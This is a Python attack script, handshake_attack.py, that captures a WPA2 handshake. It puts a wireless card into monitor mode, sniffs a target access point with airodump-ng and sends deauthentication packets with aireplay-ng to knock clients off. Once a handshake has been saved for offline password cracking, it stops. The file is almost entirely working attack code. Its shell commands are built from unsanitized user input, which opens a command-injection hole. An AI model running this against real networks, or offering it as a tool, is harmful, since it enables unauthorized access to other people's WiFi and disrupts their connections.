import os
import subprocess
import time
import shutil
from pathlib import Path
from datetime import datetime
from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel

console = Console()

print(">>> handshake_attack.py: module is being loaded")

def capture_handshake(interface: str) -> None:
    print(">>> handshake_attack.py: inside capture_handshake definition")
    """
    Capture a WPA2 4-way handshake for a specified AP and client.
    Sets monitor mode, runs airodump-ng, and triggers deauth to force handshake.
    """
    console.print(Panel("[bold cyan]🔓 4-Way Handshake Capture[/]"))

    bssid = Prompt.ask("Enter target BSSID (AP)")
    channel = Prompt.ask("Enter channel", default="6")
    essid = Prompt.ask("Enter ESSID (WiFi Name)")

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    capture_dir = Path("logs/handshakes")
    capture_dir.mkdir(parents=True, exist_ok=True)
    file_prefix = capture_dir / f"handshake_{timestamp}"

    # Set monitor mode and channel
    os.system(f"sudo ip link set {interface} down")
    os.system(f"sudo iw dev {interface} set type monitor")
    os.system(f"sudo ip link set {interface} up")
    os.system(f"sudo iwconfig {interface} channel {channel}")

    console.print(f"[yellow]📡 Listening for handshake on channel {channel}...[/]")

    # Start airodump-ng in background to capture packets
    airodump_cmd = [
        "sudo", "airodump-ng",
        "--bssid", bssid,
        "--channel", channel,
        "--essid", essid,
        "--write", str(file_prefix),
        "--output-format", "pcap",
        interface
    ]
    airodump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Deauth to force reconnection
    time.sleep(5)
    console.print(f"[bold red]⚡ Launching deauth to trigger handshake...[/]")
    subprocess.Popen(["sudo", "aireplay-ng", "--deauth", "25", "-a", bssid, interface], stdout=subprocess.DEVNULL)

    # Wait for handshake and analyze
    try:
        while True:
            pcap_path = f"{file_prefix}-01.pcap"
            if Path(pcap_path).exists():
                result = subprocess.run(
                    ["tshark", "-r", pcap_path, "-Y", "eapol", "-c", "1"],
                    stdout=subprocess.DEVNULL
                )
                if result.returncode == 0:
                    airodump_proc.terminate()
                    console.print(f"\n[bold green]✅ Handshake captured and saved to:[/] [cyan]{pcap_path}[/]")
                    break
            time.sleep(2)
    except KeyboardInterrupt:
        airodump_proc.terminate()
        console.print("[bold red]⛔ Capture stopped manually[/]")

print(">>> handshake_attack.py: end of file")
